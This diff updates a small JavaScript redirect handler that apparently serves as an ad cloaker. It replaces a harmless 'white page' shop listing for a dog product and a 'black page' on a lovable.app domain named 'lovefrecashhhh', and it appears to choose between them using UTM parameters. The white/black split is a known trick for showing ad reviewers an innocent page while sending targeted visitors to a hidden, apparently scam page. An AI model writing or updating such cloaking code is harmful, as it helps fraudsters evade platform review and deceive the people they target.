@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/nobleza-hundematte-wasserdichte-hundedecke-flauschig-und-weich-outdoor-hundedecke-S00DI0LC/";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.sigikid-usa.com/collections/only-natures-materials/products/organic-dog-plush-toy";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
